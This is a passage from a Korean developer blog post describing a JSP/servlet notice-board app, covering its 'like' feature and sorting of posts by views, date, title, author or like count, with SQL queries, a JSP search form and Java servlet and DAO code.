<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">arr</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">notice</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
</code></pre></div></div>

<h3 id="좋아요-결과"><code class="language-plaintext highlighter-rouge">좋아요</code> 결과</h3>
<ul>
  <li>게시글 삭제 전 <code class="language-plaintext highlighter-rouge">좋아요</code> 테이블<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8b780537-00f6-4e71-99c5-0bc3d9b84b50" alt="Pasted image 20230603231538" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/6edbd40b-4b09-4fcf-8804-6db360c23f31" alt="Pasted image 20230603231643" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/6240c64e-bf1f-4525-ae30-88f9e90df957" alt="Pasted image 20230603231659" /></li>
  <li>게시글 삭제 후 좋아요 테이블<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4c1b5626-d9a1-4d27-ac4a-089b4fdf5874" alt="Pasted image 20230603231720" /></li>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 클릭<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b77acc7e-a522-46cc-bb8d-c6117f325000" alt="Pasted image 20230604010909" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/1f3d40d2-e569-49a3-b3ba-dcfe983fb388" alt="Pasted image 20230604011015" /></li>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 해제<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/33c729a2-ff02-4c80-ab9e-8a169b851315" alt="Pasted image 20230604011030" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f7d9e15c-6ed6-46cf-b645-b47180abf80b" alt="Pasted image 20230604011041" /></li>
  <li>여러 사람이 <code class="language-plaintext highlighter-rouge">좋아요</code> 클릭했을 경우<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e1694599-37c5-4da4-bdd9-b786756616c4" alt="Pasted image 20230604011418" /></li>
</ul>

<h2 id="게시글-정렬">게시글 정렬</h2>

<h3 id="설명-1">설명</h3>
<ul>
  <li>조회수 or 날짜 or 제목 or 작성자명 or 좋아요수 에 따라 게시글들을 정렬한다.</li>
  <li>서버에서 사용자의 정렬 요청에 따라 페이지를 만들어 사용자에게 응답해준다.</li>
</ul>

<h3 id="db-정렬-sql-질의문">DB 정렬 SQL 질의문</h3>

<h4 id="조회수-정렬">조회수 정렬</h4>
<ul>
  <li>조회수를 이용하여 게시글을 정렬한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">notice_board</span> <span class="k">order</span> <span class="k">by</span> <span class="n">views</span> <span class="k">desc</span><span class="p">,</span> <span class="n">gen_time</span> <span class="k">desc</span><span class="p">;</span>
</code></pre></div></div>

<h4 id="날짜-정렬">날짜 정렬</h4>
<ul>
  <li>생성일을 이용하여 정렬을 한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">notice_board</span> <span class="k">order</span> <span class="k">by</span> <span class="n">gen_time</span> <span class="k">desc</span><span class="p">;</span>
</code></pre></div></div>

<h4 id="제목-정렬">제목 정렬</h4>
<ul>
  <li>제목을 우선으로 정렬을 하지만 같은 제목이 등장하면 생성일을 이용하여 정렬을 한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">notice_board</span> <span class="k">order</span> <span class="k">by</span> <span class="n">title</span><span class="p">,</span><span class="n">gen_time</span> <span class="k">desc</span><span class="p">;</span>
</code></pre></div></div>

<h4 id="작성자명-정렬">작성자명 정렬</h4>
<ul>
  <li>작성자명을 기준으로 먼저 정렬을 하고 같은 작성자명을 지닌 게시글은 생성일을 이용하여 정렬한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">notice_board</span> <span class="k">order</span> <span class="k">by</span> <span class="n">username</span><span class="p">,</span> <span class="n">gen_time</span> <span class="k">desc</span><span class="p">;</span>
</code></pre></div></div>

<h4 id="좋아요수-정렬">좋아요수 정렬</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">likes</code> 테이블을 게시글의 sid로 group by를 이용하여 묶어준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/99562249-36b3-43b9-b32a-cbae46b3c874" alt="Pasted image 20230604143109" /></li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">notice_board_sid</span><span class="p">,</span><span class="k">count</span><span class="p">(</span><span class="n">notice_board_sid</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span> 
<span class="k">from</span> <span class="n">likes</span> 
<span class="k">group</span> <span class="k">by</span> <span class="n">notice_board_sid</span><span class="p">;</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">notice_board</code> 테이블과 group by 한 <code class="language-plaintext highlighter-rouge">likes</code> 테이블을 게시글 sid를 이용하여 left join을 해준다.</li>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 수가 null 값으로 나어면 <code class="language-plaintext highlighter-rouge">coalesce</code> 함수를 이용하여 0으로 바꿔준다.</li>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 수를 나타내는 count 항목으로 정렬을 한다. <code class="language-plaintext highlighter-rouge">좋아요</code> 수가 같으면 게시글 생성일 순으로 정렬을 한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b5b19bd5-5bcf-4546-991f-a017b730d669" alt="Pasted image 20230604143648" /></li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">sid</span><span class="p">,</span> <span class="n">user_sid</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">gen_time</span><span class="p">,</span><span class="n">title</span><span class="p">,</span><span class="n">main_text</span><span class="p">,</span><span class="n">views</span><span class="p">,</span><span class="n">coalesce</span><span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="n">cnt</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="k">as</span> <span class="k">count</span> <span class="k">from</span> <span class="n">notice_board</span> <span class="k">left</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="n">likes</span><span class="p">.</span><span class="n">notice_board_sid</span><span class="p">,</span><span class="k">count</span><span class="p">(</span><span class="n">likes</span><span class="p">.</span><span class="n">user_sid</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span> <span class="k">from</span> <span class="n">likes</span> <span class="k">group</span> <span class="k">by</span> <span class="n">likes</span><span class="p">.</span><span class="n">notice_board_sid</span><span class="p">)</span> <span class="n">b</span> <span class="k">on</span> <span class="n">sid</span> <span class="o">=</span> <span class="n">notice_board_sid</span>
<span class="k">order</span> <span class="k">by</span> <span class="k">count</span> <span class="k">desc</span><span class="p">,</span> <span class="n">gen_time</span> <span class="k">desc</span><span class="p">;</span>
</code></pre></div></div>

<ul>
  <li>최종 형태</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">sid</span><span class="p">,</span> <span class="n">user_sid</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">gen_time</span><span class="p">,</span><span class="n">title</span><span class="p">,</span><span class="n">main_text</span><span class="p">,</span><span class="n">views</span><span class="p">,</span><span class="n">coalesce</span><span class="p">(</span><span class="n">b</span><span class="p">.</span><span class="n">cnt</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="k">as</span> <span class="k">count</span> <span class="k">from</span> <span class="n">notice_board</span> <span class="k">left</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="n">notice_board_sid</span><span class="p">,</span><span class="k">count</span><span class="p">(</span><span class="n">notice_board_sid</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span> <span class="k">from</span> <span class="n">likes</span> <span class="k">group</span> <span class="k">by</span> <span class="n">notice_board_sid</span><span class="p">)</span> <span class="n">b</span> <span class="k">on</span> <span class="n">sid</span> <span class="o">=</span> <span class="n">notice_board_sid</span>
<span class="k">where</span> <span class="n">username</span> <span class="k">like</span> <span class="s1">'%test%'</span>
<span class="k">order</span> <span class="k">by</span> <span class="k">count</span> <span class="k">desc</span><span class="p">,</span> <span class="n">gen_time</span> <span class="k">desc</span>
<span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">5</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
</code></pre></div></div>

<h3 id="jsp">JSP</h3>
<h4 id="notice_boardjsp-1">notice_board.jsp</h4>
<ul>
  <li>검색을 서버에 요청할 때 어떤 순으로 정렬할지 <code class="language-plaintext highlighter-rouge">order by</code> 파라미터에 넣어 전송한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/99515c62-ff99-4e16-a2a0-0a05a8d42f2b" alt="Pasted image 20230604165442" /><br /><code class="language-plaintext highlighter-rouge">?option_val=1&amp;page=1&amp;q=&amp;date_from=&amp;date_to=&amp;order_by=2</code></li>
  <li><code class="language-plaintext highlighter-rouge">order_by</code> 값으로 0 or 1 or 2 or 3 or 4 값을 넣어 서버로 요청을 보낸다. 만약 틀린 값을 넣어 보내면 날짜 순으로 정렬하게 된다.</li>
  <li>servlet 으로 부터 받은 orderBy 값을 이용하여 default 로 설정된 정렬 옵션을 선택한다.</li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">""</span> <span class="na">id=</span><span class="s">"searchForm"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;label&gt;</span>검색<span class="nt">&lt;/label&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">style=</span><span class="s">"display:none;"</span> <span class="na">name=</span><span class="s">"page"</span> <span class="na">value=</span><span class="s">"1"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"date"</span> <span class="na">name=</span><span class="s">"date_from"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"date"</span> <span class="na">name=</span><span class="s">"date_to"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"검색"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;br&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"order_by"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span> <span class="na">checked</span> <span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span> <span class="nt">&gt;</span>조회수
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"order_by"</span> <span class="na">value=</span><span class="s">"1"</span> <span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">==</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span> <span class="na">checked</span> <span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span> <span class="nt">&gt;</span>날짜
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"order_by"</span> <span class="na">value=</span><span class="s">"2"</span> <span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">==</span> <span class="mi">2</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span> <span class="na">checked</span> <span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span> <span class="nt">&gt;</span>제목
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"order_by"</span> <span class="na">value=</span><span class="s">"3"</span> <span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">==</span> <span class="mi">3</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span> <span class="na">checked</span> <span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span> <span class="nt">&gt;</span>작성자명
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"order_by"</span> <span class="na">value=</span><span class="s">"4"</span> <span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">==</span> <span class="mi">4</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span> <span class="na">checked</span> <span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span> <span class="nt">&gt;</span>좋아요수
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>

<h3 id="servlet">Servlet</h3>

<h4 id="mainpagejava-1">MainPage.java</h4>
<ul>
  <li>사용자 요청으로 정렬방법을 <code class="language-plaintext highlighter-rouge">order_by</code> 파라미터로 받는다.</li>
  <li><code class="language-plaintext highlighter-rouge">oreder_by</code> 파라미터는 오직 0,1,2,3,4 값만 가질 수 있다.</li>
  <li>정렬 순서 값을 이용하여 게시글 검색 데이터를 가지고 온다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 게시판</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"GET"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoard</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// *** 게시글 정렬 방법 ****</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 0. 조회수 순</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 1. 날짜순</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 2. 제목 순</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 3. 작성자 순</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 4. 좋아요 순</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">orderBy</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">orderBy</span> <span class="o">=</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"order_by"</span><span class="o">));</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">orderBy</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">orderBy</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">orderBy</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"orderBy"</span><span class="o">,</span> <span class="n">orderBy</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"정렬 방법 : "</span><span class="o">+</span><span class="n">orderBy</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// *** 게시글 정렬 방법 END ****</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 검색 데이터 가져오기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">array</span> <span class="o">=</span> <span class="n">noticeBoardDAO</span><span class="o">.</span><span class="na">getNoticeList</span><span class="o">(</span><span class="n">optionVal</span><span class="o">,</span><span class="n">q</span><span class="o">,</span><span class="n">start</span><span class="o">,</span><span class="n">number</span><span class="o">,</span> <span class="n">from</span><span class="o">,</span> <span class="n">to</span><span class="o">,</span> <span class="n">orderBy</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
</code></pre></div></div>

<h4 id="noticeboarddaojava-1">NoticeBoardDAO.java</h4>
<ul>
  <li>게시글 테이블에서 정렬 방법에 맞추어 SQL 쿼리문을 완성한다.</li>
  <li>정렬 방법에 따른 완성된 SQL 쿼리문을 이용하였다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">NoticeBoardDAO</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">Notice</span><span class="o">&gt;</span> <span class="nf">getNoticeList</span><span class="o">(</span><span class="kt">int</span> <span class="n">optionVal</span><span class="o">,</span><span class="nc">String</span> <span class="n">question</span><span class="o">,</span> <span class="kt">int</span> <span class="n">start</span><span class="o">,</span> <span class="kt">int</span> <span class="n">number</span><span class="o">,</span> <span class="kt">long</span> <span class="n">from</span><span class="o">,</span> <span class="kt">long</span> <span class="n">to</span><span class="o">,</span> <span class="kt">int</span> <span class="n">orderBy</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="o">||</span> <span class="n">orderBy</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">orderBy</span> <span class="o">=</span> <span class="mi">1</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">Connection</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 정렬 방법 : 4</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">orderBy</span> <span class="o">==</span> <span class="mi">4</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"select sid, user_sid, username, gen_time,title,main_text,views,coalesce(b.cnt,0) as count from "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" left join "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"(select notice_board_sid,count(notice_board_sid) as cnt from "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">likeTableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" group by notice_board_sid) b on sid = notice_board_sid"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 정렬 방법 : 0,1,2,3</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">"select * from "</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">tableName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (title like '%'||?||'%' or main_text like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">2</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (username like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">3</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (title like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">optionVal</span> <span class="o">==</span> <span class="mi">4</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">query</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">" where (main_text like '%'||?||'%')"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 게시글 범위</span>
